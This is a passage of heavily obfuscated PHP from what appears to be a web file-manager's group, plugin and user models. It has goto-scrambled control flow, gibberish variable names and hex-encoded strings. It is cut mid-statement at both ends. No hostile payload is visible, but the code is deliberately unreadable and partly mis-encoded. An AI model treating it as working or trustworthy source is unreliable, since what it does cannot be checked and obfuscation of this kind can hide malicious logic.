$aÓ¥ğ¹‰ğ©); goto BÑ¥Õ™È; BÑ¥Õ™È: $this->_listAppendParent($B¹¾¹Õ„Ë); $this->_listAppendSourceRoot($B¹¾¹Õ„Ë, $aÓ¥ğ¹‰ğ©); goto F÷”¯¿À”Â; AÒíñ¾­Êù: $dÙí®ñØ§Ğ =& $_SERVER[”Ì÷ñ­î¸]; if (!$B¹¾¹Õ„Ë) { return; } $aÓ¥ğ¹‰ğ© = array_to_keyvalue($B¹¾¹Õ„Ë, $dÙí®ñØ§Ğ[33], $dÙí®ñØ§Ğ[2106]); goto f´„Á¸ñàŒ; F÷”¯¿À”Â: } private function _listAppendChildren(&$F„š³·ßÃÆ) { goto D•Œ»“èÎã; Aä¿Ÿ™˜ğë: $e‚©å”öÖ¼ = count($F„š³·ßÃÆ); $Eì¹²µ±™ = $this->tablePrefix . $this->tableName; for ($AøíºîÎ½® = 0, $f—ò¨¶Ô = 0; $AøíºîÎ½® < $e‚©å”öÖ¼; $AøíºîÎ½®++) { $f—ò¨¶Ô++; $cèÅÛÕ£ƒè = $F„š³·ßÃÆ[$AøíºîÎ½®][$FÏïô¸ø¹¦[2106]]; $BÖÉ¿ì©· .= "\123\105\x4c\x45\x43\124\40\52\40\106\x52\117\x4d\40\x28\x53\x45\x4c\x45\x43\x54\40\x27{$cèÅÛÕ£ƒè}\137\143\150\x69\x6c\x64\x27\x20\141\163\x20\150\x61\163\x20\x46\x52\x4f\115\x20\140{$Eì¹²µ±™}\140\40\x77\x68\145\x72\145\x20\x70\141\x72\145\x6e\164\111\x44\x3d{$cèÅÛÕ£ƒè}\40\154\151\x6d\x69\x74\40\61\51\x20\x61\x73\x20\x74\x62\x5f{$cèÅÛÕ£ƒè}\x20\165\156\x69\157\156\x20\141\x6c\154\x20"; if (($f—ò¨¶Ô >= 20 || $AøíºîÎ½® == $e‚©å”öÖ¼ - 1) && $BÖÉ¿ì©·) { $BÖÉ¿ì©· = substr($BÖÉ¿ì©·, 0, -strlen($FÏïô¸ø¹¦[449])); $b¦ìÙ´µß¢ = $this->query($BÖÉ¿ì©·); $b·¯Ú¼®Ï„ = array_merge($b·¯Ú¼®Ï„, $b¦ìÙ´µß¢); $f—ò¨¶Ô = 0; $BÖÉ¿ì©· = $FÏïô¸ø¹¦[33]; } } goto d£øÌˆÛõ; D•Œ»“èÎã: $FÏïô¸ø¹¦ =& $_SERVER[”Ì÷ñ­î¸]; $BÖÉ¿ì©· = $FÏïô¸ø¹¦[361]; $b·¯Ú¼®Ï„ = array(); goto Aä¿Ÿ™˜ğë; d£øÌˆÛõ: $b·¯Ú¼®Ï„ = array_to_keyvalue($b·¯Ú¼®Ï„, $FÏïô¸ø¹¦[450]); foreach ($F„š³·ßÃÆ as &$FÉš·©šŞÜ) { $FÉš·©šŞÜ[$FÏïô¸ø¹¦[2188]] = isset($b·¯Ú¼®Ï„[$FÉš·©šŞÜ[$FÏïô¸ø¹¦[2106]] . $FÏïô¸ø¹¦[2189]]); } goto d”Æ¼¡Å²; d”Æ¼¡Å²: } private function _listAppendChildrenMember(&$F—òïš×š¾) { goto D’Ä£´å; Eã·ŠÆ‘ÆË: $bÎˆÜØ÷†„ = count($F—òïš×š¾); $Bôæ‡¶¼ßÓ = $this->tablePrefix . $bƒ±²ø¸§[2180]; for ($b©é’°×—Û = 0, $c–·À§ØÕÌ = 0; $b©é’°×—Û < $bÎˆÜØ÷†„; $b©é’°×—Û++) { $c–·À§ØÕÌ++; $C¸ŸÈç‰ÙÃ = $F—òïš×š¾[$b©é’°×—Û][$bƒ±²ø¸§[2106]]; $E¥ÔŠÎçŞø .= "\123\x45\114\x45\103\x54\x20\52\40\x46\122\x4f\115\x20\x28\x53\x45\114\x45\x43\x54\x20\47{$C¸ŸÈç‰ÙÃ}\137\x63\150\151\x6c\144\x27\x20\x61\163\x20\x68\141\163\40\106\x52\x4f\x4d\x20\140{$Bôæ‡¶¼ßÓ}\x60\40\x77\x68\145\162\x65\x20\147\x72\157\165\160\111\104\x3d{$C¸ŸÈç‰ÙÃ}\x20\154\151\155\151\164\40\61\x29\40\141\163\40\x74\142\x5f{$C¸ŸÈç‰ÙÃ}\40\165\x6e\x69\157\x6e\x20\141\x6c\x6c\40"; if (($c–·À§ØÕÌ >= 20 || $b©é’°×—Û == $bÎˆÜØ÷†„ - 1) && $E¥ÔŠÎçŞø) { $E¥ÔŠÎçŞø = substr($E¥ÔŠÎçŞø, 0, -strlen($bƒ±²ø¸§[449])); $eˆ†ÔÒôàÈ = $this->query($E¥ÔŠÎçŞø); $F‘Ä«†ÍŠù = array_merge($F‘Ä«†ÍŠù, $eˆ†ÔÒôàÈ); $c–·À§ØÕÌ = 0; $E¥ÔŠÎçŞø = $bƒ±²ø¸§[33]; } } goto E«†£Ÿ¤º; E«†£Ÿ¤º: $F‘Ä«†ÍŠù = array_to_keyvalue($F‘Ä«†ÍŠù, $bƒ±²ø¸§[450]); foreach ($F—òïš×š¾ as &$f¯ÂÜèóÅÓ) { $f¯ÂÜèóÅÓ[$bƒ±²ø¸§[2190]] = isset($F‘Ä«†ÍŠù[$f¯ÂÜèóÅÓ[$bƒ±²ø¸§[2106]] . $bƒ±²ø¸§[2189]]); } goto fã²¶­Œïš; D’Ä£´å: $bƒ±²ø¸§ =& $_SERVER[”Ì÷ñ­î¸]; $E¥ÔŠÎçŞø = $bƒ±²ø¸§[361]; $F‘Ä«†ÍŠù = array(); goto Eã·ŠÆ‘ÆË; fã²¶­Œïš: } private function _listAppendMeta(&$D¢á‰ô•Ê†, $Cè„¥¹”ä™) { $AÄ­Â÷’‚³ =& $_SERVER[”Ì÷ñ­î¸]; $C°šŠĞßï” = array($AÄ­Â÷’‚³[2106] => array($AÄ­Â÷’‚³[7], $Cè„¥¹”ä™)); $Bº‘ìÏ«¤ = Model($AÄ­Â÷’‚³[2179])->where($C°šŠĞßï”)->select(); $Bº‘ìÏ«¤ = array_to_keyvalue_group($Bº‘ìÏ«¤, $AÄ­Â÷’‚³[2106]); foreach ($Bº‘ìÏ«¤ as &$dè£­Õ¯‘¼) { $dè£­Õ¯‘¼ = array_to_keyvalue($dè£­Õ¯‘¼, $AÄ­Â÷’‚³[89], $AÄ­Â÷’‚³[359]); } foreach ($D¢á‰ô•Ê† as &$E·¹ˆ¾’ë) { $E·¹ˆ¾’ë[$AÄ­Â÷’‚³[417]] = array(); if (isset($Bº‘ìÏ«¤[$E·¹ˆ¾’ë[$AÄ­Â÷’‚³[2106]]])) { $E·¹ˆ¾’ë[$AÄ­Â÷’‚³[417]] = $Bº‘ìÏ«¤[$E·¹ˆ¾’ë[$AÄ­Â÷’‚³[2106]]]; } } } protected function parentLevelArray($dœªšÏˆÏ) { $D¢¦ñ¹à×é =& $_SERVER[”Ì÷ñ­î¸]; $dœªšÏˆÏ = explode($D¢¦ñ¹à×é[47], trim($dœªšÏˆÏ, $D¢¦ñ¹à×é[47])); $dœªšÏˆÏ = array_remove_value($dœªšÏˆÏ, $D¢¦ñ¹à×é[468]); return $dœªšÏˆÏ; } private function _listAppendParent(&$D„Ÿğ–Ûò) { goto aë‚—ò; fõà‰Şƒâ: foreach ($D„Ÿğ–Ûò as &$FÍ µïß”—) { $B©×ÜõË» = $this->parentLevelArray($FÍ µïß”—[$dÎá¸ØÛ†[459]]); $D¥¯˜ÓÂ©¦ = $dÎá¸ØÛ†[33]; foreach ($B©×ÜõË» as $F™­ø²ÍŠ¥) { $D¥¯˜ÓÂ©¦ .= $d¿ˆöÜ¦î[$F™­ø²ÍŠ¥] . $dÎá¸ØÛ†[8]; } if ($B©×ÜõË») { $D¥¯˜ÓÂ©¦ .= $FÍ µïß”—[$dÎá¸ØÛ†[28]]; } $FÍ µïß”—[$dÎá¸ØÛ†[463]] = str_replace($dÎá¸ØÛ†[467], $dÎá¸ØÛ†[8], $D¥¯˜ÓÂ©¦); } goto e¡ÒÍä‡‹; bÌßŒ›ŞÜ: $BÙ’±Õ¼Ú® = array(); foreach ($d¿ˆöÜ¦î as $A—Å´¡à· => $a Í’ÈÇ½Ò) { if (!$a Í’ÈÇ½Ò) { $BÙ’±Õ¼Ú®[] = $A—Å´¡à·; } } if ($BÙ’±Õ¼Ú®) { $D‚ÜÔé“Ü = array($dÎá¸ØÛ†[2178] => array($dÎá¸ØÛ†[384], $BÙ’±Õ¼Ú®)); $Cæ±Š³ØÕ¦ = $this->field($dÎá¸ØÛ†[2191])->where($D‚ÜÔé“Ü)->select(); $Còœ¾õ¸» = array_to_keyvalue($Cæ±Š³ØÕ¦, $dÎá¸ØÛ†[2106], $dÎá¸ØÛ†[28]); $d¿ˆöÜ¦î = array_merge_index($d¿ˆöÜ¦î, $Còœ¾õ¸»); } goto fõà‰Şƒâ; aë‚—ò: $dÎá¸ØÛ† =& $_SERVER[”Ì÷ñ­î¸]; $d¿ˆöÜ¦î = array(); foreach ($D„Ÿğ–Ûò as &$FÍ µïß”—) { $d¿ˆöÜ¦î[$FÍ µïß”—[$dÎá¸ØÛ†[2106]]] = $FÍ µïß”—[$dÎá¸ØÛ†[28]]; $B©×ÜõË» = $this->parentLevelArray($FÍ µïß”—[$dÎá¸ØÛ†[459]]); foreach ($B©×ÜõË» as $F™­ø²ÍŠ¥) { if (!isset($d¿ˆöÜ¦î[$F™­ø²ÍŠ¥])) { $d¿ˆöÜ¦î[$F™­ø²ÍŠ¥] = 0; } } } goto bÌßŒ›ŞÜ; e¡ÒÍä‡‹: } private function _listAppendSourceRoot(&$aàÏ²òéÍˆ, $bçäÄ“ô‡¯) { goto döÈ‡ãË“; bÁ…ÜÄ²¤: $AŒ‚®àÈà… = Model($d×Ò¡±ñø¶[754])->order($d×Ò¡±ñø¶[2193])->field($b‘áÂŸâÅ©)->where($B…Ö‘‹¬¦)->select(); $AŒ‚®àÈà… = array_to_keyvalue($AŒ‚®àÈà…, $d×Ò¡±ñø¶[456]); $AŒ‚®àÈà… = array_remove_key($AŒ‚®àÈà…, $d×Ò¡±ñø¶[456]); goto aè‰Ïƒ¡”ò; döÈ‡ãË“: $d×Ò¡±ñø¶ =& $_SERVER[”Ì÷ñ­î¸]; $B…Ö‘‹¬¦ = array($d×Ò¡±ñø¶[371] => SourceModel::TYPE_GROUP, $d×Ò¡±ñø¶[461] => 0, $d×Ò¡±ñø¶[456] => array($d×Ò¡±ñø¶[7], $bçäÄ“ô‡¯)); $b‘áÂŸâÅ© = $d×Ò¡±ñø¶[2192]; goto bÁ…ÜÄ²¤; aè‰Ïƒ¡”ò: foreach ($aàÏ²òéÍˆ as &$aŞ‘»¾ôˆŸ) { $aŞ‘»¾ôˆŸ[$d×Ò¡±ñø¶[391]] = $AŒ‚®àÈà…[$aŞ‘»¾ôˆŸ[$d×Ò¡±ñø¶[2106]]] ? $AŒ‚®àÈà…[$aŞ‘»¾ôˆŸ[$d×Ò¡±ñø¶[2106]]] : array(); } goto cæ´­µè§; cæ´­µè§: } protected function resetParentLevel() { $CíšÅİË¢’ =& $_SERVER[”Ì÷ñ­î¸]; $fõÆåÙìÈ´ = $CíšÅİË¢’[2106]; $dŸ‹’˜Â¸ğ = $this->select(); $dŸ‹’˜Â¸ğ = array_to_keyvalue($dŸ‹’˜Â¸ğ, $fõÆåÙìÈ´); foreach ($dŸ‹’˜Â¸ğ as $aÃšáÒÎ²ß) { goto b¬«„¡…²Ò; b¬«„¡…²Ò: $C¢‹Şæ›ØÀ = $aÃšáÒÎ²ß; $CŞäìÈ¹á = array(); while ($C¢‹Şæ›ØÀ[$CíšÅİË¢’[461]] != 0) { $CŞäìÈ¹á[] = $C¢‹Şæ›ØÀ[$CíšÅİË¢’[461]]; $C¢‹Şæ›ØÀ = $dŸ‹’˜Â¸ğ[$C¢‹Şæ›ØÀ[$CíšÅİË¢’[461]]]; } goto e‚…¨ë´êä; dÎ‚õĞ¡÷æ: $this->where(array($fõÆåÙìÈ´ => $aÃšáÒÎ²ß[$fõÆåÙìÈ´]))->save(array($CíšÅİË¢’[525] => $CŞäìÈ¹á)); goto béğ‡‡è·; e‚…¨ë´êä: $CŞäìÈ¹á[] = 0; $CŞäìÈ¹á = $CíšÅİË¢’[47] . implode($CíšÅİË¢’[47], array_reverse($CŞäìÈ¹á)) . $CíšÅİË¢’[47]; $this->setNamePinyin($aÃšáÒÎ²ß[$fõÆåÙìÈ´], $aÃšáÒÎ²ß[$CíšÅİË¢’[28]]); goto dÎ‚õĞ¡÷æ; béğ‡‡è·: } return $dŸ‹’˜Â¸ğ; } public function groupNameAuto($A˜¡¦ÂÎà×, $eÑ¢’ Œò‹) { $aÌ¸¦éì¼ =& $_SERVER[”Ì÷ñ­î¸]; $A±ŒÄ•Ç°Å = $this->where(array($aÌ¸¦éì¼[368] => $A˜¡¦ÂÎà×))->getField($aÌ¸¦éì¼[28], !0); if (!$A±ŒÄ•Ç°Å || !in_array($eÑ¢’ Œò‹, $A±ŒÄ•Ç°Å)) { return $eÑ¢’ Œò‹; } for ($C¼ƒ±–›Òá = 1; $C¼ƒ±–›Òá <= count($A±ŒÄ•Ç°Å) + 1; $C¼ƒ±–›Òá++) { $AÓäÅ×ŸêÅ = $eÑ¢’ Œò‹ . "\x28{$C¼ƒ±–›Òá}\x29"; if (!in_array($AÓäÅ×ŸêÅ, $A±ŒÄ•Ç°Å)) { return $AÓäÅ×ŸêÅ; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\x2e\160\x6c\x75\147\151\156\x4c\151\163\x74"; public $field = array("\156\x61\x6d\x65", "\163\164\x61\164\x75\163", "\x72\x65\x67\151\x65\163\x74", "\x63\157\x6e\146\151\x67"); public function loadList($dİ¸Ã¸è» = false) { $D¿ŒâìŒñõ = array_to_keyvalue($this->listData(), $_SERVER[”Ì÷ñ­î¸][28]); if ($dİ¸Ã¸è») { return $D¿ŒâìŒñõ[$dİ¸Ã¸è»]; } return $D¿ŒâìŒñõ; } public function init() { $Fê¼ã¥® =& $_SERVER[”Ì÷ñ­î¸]; Hook::trigger($Fê¼ã¥®[2194]); $aÓàÇêç‘ = $this->loadPluginList(); foreach ($aÓàÇêç‘ as $Bó ÅÓ˜¥Ö => $a÷ËùõÅÁ”) { $F’Î‡™›© = $this->appAllow($Bó ÅÓ˜¥Ö, $a÷ËùõÅÁ”); if (!$F’Î‡™›©) { continue; } foreach ($a÷ËùõÅÁ”[$Fê¼ã¥®[2195]] as $eÍõª²Û ß => $F³ µ°ÈÙˆ) { Hook::bind($eÍõª²Û ß, $F³ µ°ÈÙˆ); } } Hook::trigger($Fê¼ã¥®[2196]); Hook::trigger(ACTION); } public function appAllow($BˆãŠÇ„„­, $cÀÁº›½ê£, $e°ò¸ìÆŠ = true) { $bÊ®Íì­ =& $_SERVER[”Ì÷ñ­î¸]; $eªªà¶Ìò– = PLUGIN_DIR . $BˆãŠÇ„„­ . $bÊ®Íì­[2197]; if (!is_array($cÀÁº›½ê£) || !is_array($cÀÁº›½ê£[$bÊ®Íì­[2195]]) || !is_file($eªªà¶Ìò–) || $cÀÁº›½ê£[$bÊ®Íì­[690]] != 1) { return !1; } if ($e°ò¸ìÆŠ && !Action($bÊ®Íì­[2198])->checkAuth($BˆãŠÇ„„­)) { return !1; } return !0; } public function unInstall($f›¹‘´šò) { $D¹Ğ”»æÖÛ =& $_SERVER[”Ì÷ñ­î¸]; $c›À‚¤†“ = $this->loadList($f›¹‘´šò); if (file_exists(PLUGIN_DIR . $f›¹‘´šò)) { Hook::apply($f›¹‘´šò . $D¹Ğ”»æÖÛ[2199]); } $this->remove($c›À‚¤†“[$D¹Ğ”»æÖÛ[367]]); } public function changeStatus($aŠÎš²Î¦…, $bºÌƒÍ¾Ãõ) { $Aì…ÂÙçŒ =& $_SERVER[”Ì÷ñ­î¸]; $C¾ëÂ²Üœ£ = $this->loadList($aŠÎš²Î¦…); if ($bºÌƒÍ¾Ãõ) { Hook::apply($aŠÎš²Î¦… . $Aì…ÂÙçŒ[2200]); } $this->update($C¾ëÂ²Üœ£[$Aì…ÂÙçŒ[367]], array($Aì…ÂÙçŒ[2201] => $bºÌƒÍ¾Ãõ)); } public function appRegist($e°çõ—àš, $Dí†ñ›ÒŠø) { $càÛË®­¬µ =& $_SERVER[”Ì÷ñ­î¸]; $E‹İæŠè‹… = $this->loadList($e°çõ—àš); if ($E‹İæŠè‹…) { $this->update($E‹İæŠè‹…[$càÛË®­¬µ[367]], array($càÛË®­¬µ[2195] => $Dí†ñ›ÒŠø)); } else { $C¡æ­¤Òİù = array($càÛË®­¬µ[28] => $e°çõ—àš, $càÛË®­¬µ[2195] => $Dí†ñ›ÒŠø, $càÛË®­¬µ[690] => 0, $càÛË®­¬µ[6] => $this->getConfigDefault($e°çõ—àš)); $this->insert($C¡æ­¤Òİù); } } public function getConfigDefault($A“³†¤ˆŒš) { $B¢íŠåŠõ¦ =& $_SERVER[”Ì÷ñ­î¸]; $F—ë¥±‡ÓÉ = array(); $dâî›É·©Ï = $this->getPackageJson($A“³†¤ˆŒš); if (!$dâî›É·©Ï && is_array($dâî›É·©Ï[$B¢íŠåŠõ¦[2202]])) { return $F—ë¥±‡ÓÉ; } foreach ($dâî›É·©Ï[$B¢íŠåŠõ¦[2202]] as $aŒåµ—¸İ¸ => $a³ÊÍ²ãÆÃ) { if (!isset($a³ÊÍ²ãÆÃ[$B¢íŠåŠõ¦[359]]) || isset($F—ë¥±‡ÓÉ[$aŒåµ—¸İ¸])) { continue; } $F—ë¥±‡ÓÉ[$aŒåµ—¸İ¸] = $a³ÊÍ²ãÆÃ[$B¢íŠåŠõ¦[359]]; } return $F—ë¥±‡ÓÉ; } public function getPackageJson($D§†˜êÏñ³) { return Hook::apply($D§†˜êÏñ³ . $_SERVER[”Ì÷ñ­î¸][2203]); } public function getConfig($båÑÓ¶³èÆ, $EóÄ„ÇÔ¥ = false) { $Cº¦áá‚¹ä =& $_SERVER[”Ì÷ñ­î¸]; $AÀñ÷Òªµ = array(); $F™Ç×Æ©ˆê = $this->loadList($båÑÓ¶³èÆ); if ($F™Ç×Æ©ˆê && is_array($F™Ç×Æ©ˆê[$Cº¦áá‚¹ä[6]])) { $AÀñ÷Òªµ = $F™Ç×Æ©ˆê[$Cº¦áá‚¹ä[6]]; } if (!$AÀñ÷Òªµ || $EóÄ„ÇÔ¥) { $AÀñ÷Òªµ = $this->getConfigDefault($båÑÓ¶³èÆ); } return $AÀñ÷Òªµ; } public function setConfig($d„‚¼âÀÏ‰, $bİœ§­º‰  = false) { goto BÛä‰ºÕšš; A¦¾®ÕĞ¦: $Bªİ¼é¢­ = $c…ºö ‘ˆ¼[$a—›ó¼¶ßù[6]]; if ($bİœ§­º‰  == !1) { $Bªİ¼é¢­ = array(); $bİœ§­º‰  = $this->getConfigDefault($d„‚¼âÀÏ‰); } foreach ($bİœ§­º‰  as $e¿“Ôö‚ñÊ => $Bµµè½ŸÇ‚) { $Bªİ¼é¢­[$e¿“Ôö‚ñÊ] = is_string($Bµµè½ŸÇ‚) ? trim($Bµµè½ŸÇ‚) : $Bµµè½ŸÇ‚; } goto dØÈÃâ±; BÛä‰ºÕšš: $a—›ó¼¶ßù =& $_SERVER[”Ì÷ñ­î¸]; $c…ºö ‘ˆ¼ = $this->loadList($d„‚¼âÀÏ‰); if (!$c…ºö ‘ˆ¼) { return !1; } goto A¦¾®ÕĞ¦; dØÈÃâ±: $this->update($c…ºö ‘ˆ¼[$a—›ó¼¶ßù[367]], array($a—›ó¼¶ßù[6] => $Bªİ¼é¢­)); goto eÑï£±ø; eÑï£±ø: } public function viewList() { goto C²Ô†ÓÏ¸¯; dê‚—“®ŞÇ: return $B°ÖŠ˜Ëø; goto cå ß¢‡·ê; c…ØÂ‘®ã: $cšÛèã•°’ = $this->loadPluginList(); $B°ÖŠ˜Ëø = array(); foreach ($cšÛèã•°’ as $cÊº¦¨Ô¿¢ => $FĞà­Éãéö) { unset($FĞà­Éãéö[$F¸ÁÈñ„õÍ[2195]], $FĞà­Éãéö[$F¸ÁÈñ„õÍ[6]]); $f…¸¾£Äôò = PLUGIN_DIR . $FĞà­Éãéö[$F¸ÁÈñ„õÍ[28]] . $F¸ÁÈñ„õÍ[2197]; if (!is_file($f…¸¾£Äôò)) { continue; } $A›ªè¥ƒÇ½ = Hook::apply($FĞà­Éãéö[$F¸ÁÈñ„õÍ[28]] . $F¸ÁÈñ„õÍ[2203]); if (is_array($A›ªè¥ƒÇ½)) { $B°ÖŠ˜Ëø[$cÊº¦¨Ô¿¢] = array_merge($FĞà­Éãéö, $A›ªè¥ƒÇ½); } } goto dê‚—“®ŞÇ; C²Ô†ÓÏ¸¯: $F¸ÁÈñ„õÍ =& $_SERVER[”Ì÷ñ­î¸]; $cšÛèã•°’ = $this->loadList(); $this->pluginScan($cšÛèã•°’); goto c…ØÂ‘®ã; cå ß¢‡·ê: } private function loadPluginList() { $B£ƒçØ„‹Ó =& $_SERVER[”Ì÷ñ­î¸]; $eÏÔ¾‘ŠÉ› = $this->loadList(); if (strtolower(MOD) == $B£ƒçØ„‹Ó[2204]) { return $eÏÔ¾‘ŠÉ›; } $fˆñíêËŞé = Hook::trigger($B£ƒçØ„‹Ó[2205], $eÏÔ¾‘ŠÉ›); if ($eÏÔ¾‘ŠÉ› && !$fˆñíêËŞé) { die; } return $fˆñíêËŞé ? $fˆñíêËŞé : $eÏÔ¾‘ŠÉ›; } private function pluginScan($E©®ŠìÉ) { $fÇì¤£ =& $_SERVER[”Ì÷ñ­î¸]; recursion_dir(PLUGIN_DIR, $Dî‡ß•‰´°, $f§²‘ÎŸ‚¼, 0); foreach ($Dî‡ß•‰´° as $b¯ô›½ì Ì) { $aÉÚÅÆÆñ¢ = get_path_this($b¯ô›½ì Ì); if (isset($E©®ŠìÉ[$aÉÚÅÆÆñ¢]) || !file_exists($b¯ô›½ì Ì . $fÇì¤£[2206]) || !file_exists($b¯ô›½ì Ì . $fÇì¤£[2197])) { continue; } Hook::apply($aÉÚÅÆÆñ¢ . $fÇì¤£[2200]); } } } goto E‚Ú¤”äé¸; DÅŒÈÀíéÌ: define($_SERVER[”Ì÷ñ­î¸][227], 2); define($_SERVER[”Ì÷ñ­î¸][228], 3); define($_SERVER[”Ì÷ñ­î¸][229], 1); goto c—ôê±öÚ‹; EæÙÕ’Û´ö: class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\162"; protected $tableMeta = array("\164\x61\142\154\145\116\141\x6d\x65" => "\165\163\x65\162\137\155\145\x74\141", "\155\x65\164\x61\x46\x69\145\154\x64" => "\165\163\x65\x72\x49\x44"); protected $simpleField = "\x75\x73\145\x72\x49\x44\54\156\151\x63\x6b\x4e\141\155\145\54\x6e\141\x6d\145\x2c\141\x76\141\x74\x61\162\54\x73\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($DÎùª·Š’µ) { $DÈƒ·×îƒ£ =& $_SERVER[”Ì÷ñ­î¸]; $dà±‚…³Ü = $DÈƒ·×îƒ£[2494]; return array($DÈƒ·×îƒ£[2172] => array($DÎùª·Š’µ[0], $dà±‚…³Ü), $DÈƒ·×îƒ£[2174] => array($DÎùª·Š’µ[0], $dà±‚…³Ü), $DÈƒ·×îƒ£[2495] => array($DÎùª·Š’µ[0], $dà±‚…³Ü)); } protected function getInfo($CÚöÕôÏ˜‰, $BãÏ¥‰Ãœ = false) { $Cñã‡—¥ğÅ = $this->getInfoSimple($CÚöÕôÏ˜‰); if (!is_array($Cñã‡—¥ğÅ)) { return array(); } if ($BãÏ¥‰Ãœ) { return $this->_getInfoApply($Cñã‡—¥ğÅ); } return $this->cacheFunctionGet($_SERVER[”Ì÷ñ­î¸][2214], $CÚöÕôÏ˜‰); } protected function getInfoFull($B§˜®Ş¨†Ü, $BèÄë‡¦¨ = false) { $Fèá¶óîì² = $this->getInfoSimple($B§˜®Ş¨†Ü); if (!is_array($Fèá¶óîì²)) { return array(); } if ($BèÄë‡¦¨) { return $this->_getInfoApply($Fèá¶óîì², !0); return $this->_getInfoApply($Fèá¶óîì², !0); } return $this->cacheFunctionGet($_SERVER[”Ì÷ñ­î¸][2496], $B§˜®Ş¨†Ü); } private function _getInfoApply($Cì¾Òæ»Ğ‹, $cŒÙ¥ö = false) { goto fŠöö‰§Ä; bÖ‚‹®âº: $Cì¾Òæ»Ğ‹[$dÍÅ„††Å¾[391]][$dÍÅ„††Å¾[2331]] = isset($DÎĞÙ»Í†[$dÍÅ„††Å¾[2332]]) ? $DÎĞÙ»Í†[$dÍÅ„††Å¾[2332]] : null; if ($cŒÙ¥ö) { $Cì¾Òæ»Ğ‹[$dÍÅ„††Å¾[417]] = $this->metaGet($Cì¾Òæ»Ğ‹[$dÍÅ„††Å¾[1439]]); } return $Cì¾Òæ»Ğ‹; goto aêÃ¸é®ºŠ; fŠöö‰§Ä: $dÍÅ„††Å¾ =& $_SERVER[”Ì÷ñ­î¸]; if (!$Cì¾Òæ»Ğ‹) { return $Cì¾Òæ»Ğ‹; } $dÆÇâ¹µ± = md5($dÍÅ„††Å¾[2497] . $Cì¾Òæ»Ğ‹[$dÍÅ„††Å¾[804]] . $dÍÅ„††Å¾[2498] . $Cì¾Òæ»Ğ‹[$dÍÅ„††Å¾[28]]); goto C†·† ø˜; C†·† ø˜: $Cì¾Òæ»Ğ‹ = $this->_listDataApplyItem($Cì¾Òæ»Ğ‹); $DÎĞÙ»Í† = Model($dÍÅ„††Å¾[1117])->metaGet($Cì¾Òæ»Ğ‹[$dÍÅ„††Å¾[391]][$dÍÅ„††Å¾[369]]); $Cì¾Òæ»Ğ‹[$dÍÅ„††Å¾[2499]] = $dÆÇâ¹µ±; goto bÖ‚‹®âº; aêÃ¸é®ºŠ: } protected function getInfoSimple($E£º›ÒÈ¬È, $aÀâ±µ¦¼ã = false) { $aœ‚É¨¼ƒ‡ =& $_SERVER[”Ì÷ñ­î¸]; if (!$E£º›ÒÈ¬È) { return array(); } if ($aÀâ±µ¦¼ã) { $A¹»ÑëØÎ¼ = $this->where(array($aœ‚É¨¼ƒ‡[1439] => intval($E£º›ÒÈ¬È)))->find(); if (!is_array($A¹»ÑëØÎ¼)) { return array(); } $A¹»ÑëØÎ¼[$aœ‚É¨¼ƒ‡[2500]] = Action($aœ‚É¨¼ƒ‡[2501])->parseUrl($A¹»ÑëØÎ¼[$aœ‚É¨¼ƒ‡[2500]]); return $A¹»ÑëØÎ¼; } return $this->cacheFunctionGet($aœ‚É¨¼ƒ‡[2175], $E£º›ÒÈ¬È); } protected function getInfoSimpleOuter($e™Í¾õé) { goto C¸ªäª¸öì; bƒÜÅÜùÀÓ: return $Aë¿œùè¸; goto a²ÇË÷’Ùœ; a¬ªö§é­: $Aë¿œùè¸ = array_field_key($F®âÒ†Û‡¡, explode($c›ÊŸç¥Ï™[47], $this->simpleField)); if (!$Aë¿œùè¸) { return array($c›ÊŸç¥Ï™[1439] => $c›ÊŸç¥Ï™[1031], $c›ÊŸç¥Ï™[28] => $c›ÊŸç¥Ï™[157] . LNG($c›ÊŸç¥Ï™[2504]) . $c›ÊŸç¥Ï™[476], $c›ÊŸç¥Ï™[2500] => STATIC_PATH . $c›ÊŸç¥Ï™[2505]); } $Aë¿œùè¸[$c›ÊŸç¥Ï™[2500]] = Action($c›ÊŸç¥Ï™[2501])->parseUrl($Aë¿œùè¸[$c›ÊŸç¥Ï™[2500]]); goto bƒÜÅÜùÀÓ; C¸ªäª¸öì: $c›ÊŸç¥Ï™ =& $_SERVER[”Ì÷ñ­î¸]; if (!$e™Í¾õé || $e™Í¾õé == 0) { return array($c›ÊŸç¥Ï™[1439] => $c›ÊŸç¥Ï™[468], $c›ÊŸç¥Ï™[28] => $c›ÊŸç¥Ï™[157] . LNG($c›ÊŸç¥Ï™[2502]) . $c›ÊŸç¥Ï™[476], $c›ÊŸç¥Ï™[2500] => STATIC_PATH . $c›ÊŸç¥Ï™[2503]); } $F®âÒ†Û‡¡ = $this->cacheFunctionGet($c›ÊŸç¥Ï™[2175], $e™Í¾õé); goto a¬ªö§é­; a²ÇË÷’Ùœ: } protected function groupUser($cÈèöâÉîÄ) { } public static function errorLang($a„×À–Óğ) { $a‰á¡ÏÃè¥ =& $_SERVER[”Ì÷ñ­î¸]; $EÓ¹Ë’²çí = array(self::ERROR_USER_NOT_EXISTS => $a‰á¡ÏÃè¥[2506], self::ERROR_USER_PASSWORD_ERROR => $a‰á¡ÏÃè¥[2507], self::ERROR_USER_EXIST_NAME => $a‰á¡ÏÃè¥[2508], self::ERROR_USER_EXIST_PHONE => $a‰á¡ÏÃè¥[2509], self::ERROR_USER_EXIST_EMAIL => $a‰á¡ÏÃè¥[2510], self::ERROR_USER_LOGIN_LOCK => $a‰á¡ÏÃè¥[2511], self::ERROR_IP_NOT_ALLOW => $a‰á¡ÏÃè¥[2512], self::ERROR_USER_EXIST_NICKNAME => $a‰á¡ÏÃè¥[2513]); return LNG($EÓ¹Ë’²çí[$a„×À–Óğ]); } public function getInfoByMeta($bƒùùëŠ¦«, $C¼æã³â) { $eù¯ğñ¼ =& $_SERVER[”Ì÷ñ­î¸]; $bÚİÚ‚ÉÜæ = Model($eù¯ğñ¼[2514])->where(array($eù¯ğñ¼[89] => $bƒùùëŠ¦«, $eù¯ğñ¼[359] => $C¼æã³â))->find(); if ($bÚİÚ‚ÉÜæ) { return $this->getInfo($bÚİÚ‚ÉÜæ[$eù¯ğñ¼[1439]]); } return !1; } public function 